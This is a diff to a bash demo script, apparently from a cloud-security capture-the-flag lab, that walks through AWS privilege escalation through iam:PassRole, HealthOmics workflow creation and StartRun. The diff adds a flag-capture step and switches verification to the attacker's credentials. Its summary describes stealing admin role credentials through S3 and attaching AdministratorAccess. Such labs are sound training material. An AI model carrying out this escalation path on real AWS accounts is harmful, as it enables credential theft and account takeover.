@@ -1,4 +1,5 @@
 #!/bin/bash
+set -e
 
 # Demo script for iam:PassRole + omics:CreateWorkflow + omics:StartRun privilege escalation
 # This scenario demonstrates how a user with PassRole, CreateWorkflow, and StartRun can escalate
@@ -140,6 +141,14 @@ use_ecr_push_creds() {
     export AWS_SECRET_ACCESS_KEY="$ECR_PUSH_SECRET_KEY"
     unset AWS_SESSION_TOKEN
 }
+
+# Source demo permissions library for validation restriction
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"
+
+# Restrict helpful permissions during validation run
+restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 
 # Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
@@ -566,7 +575,7 @@ echo -e "${YELLOW}Step 13: Verifying privilege escalation${NC}"
 echo "Waiting 15 seconds for IAM policy to propagate..."
 sleep 15
 
-# [OBSERVATION]
+# Use readonly creds to confirm the policy attachment via IAM read
 use_readonly_creds
 # Keep region consistent
 export AWS_REGION=$AWS_REGION
@@ -587,13 +596,16 @@ else
 fi
 echo ""
 
-echo "Attempting to list IAM users..."
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
+# Switch to starting user credentials to confirm their new admin access works
+use_starting_creds
+export AWS_REGION=$AWS_REGION
+echo "Verifying starting user can now list IAM users (proves admin escalation worked)..."
+show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
-    echo -e "${GREEN}Successfully listed IAM users!${NC}"
+    echo -e "${GREEN}Successfully listed IAM users as starting user!${NC}"
     echo -e "${GREEN}ADMIN ACCESS CONFIRMED${NC}"
 else
-    echo -e "${RED}Failed to list users${NC}"
+    echo -e "${RED}Failed to list users as starting user${NC}"
     rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip /tmp/stolen_creds.json
     exit 1
 fi
@@ -602,9 +614,31 @@ echo ""
 # Clean up temporary files
 rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip /tmp/stolen_creds.json
 
+# [EXPLOIT]
+# Step 14: Capture the CTF flag
+# The starting user now has AdministratorAccess attached (via the stolen admin role
+# credentials used in step 12). Switch back to starting user creds and read the flag.
+use_starting_creds
+export AWS_REGION=$AWS_REGION
+echo -e "${YELLOW}Step 14: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/omics-001-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with iam:PassRole, omics:CreateWorkflow, omics:StartRun)"
@@ -614,12 +648,14 @@ echo "4. Started workflow run passing admin role ($ADMIN_ROLE_NAME) via iam:Pass
 echo "5. Workflow task exfiltrated admin role credentials to S3 (HealthOmics cannot call IAM directly)"
 echo "6. Retrieved stolen credentials and used them to attach AdministratorAccess to $STARTING_USER"
 echo "7. Achieved: Administrator Access"
+echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER -> (omics:CreateWorkflow) -> WDL workflow"
 echo "  -> (iam:PassRole + omics:StartRun with $ADMIN_ROLE_NAME)"
 echo "  -> Workflow task exfiltrates admin creds to S3"
 echo "  -> Attacker retrieves creds -> (iam:AttachUserPolicy) -> Admin"
+echo "  -> (ssm:GetParameter) -> CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
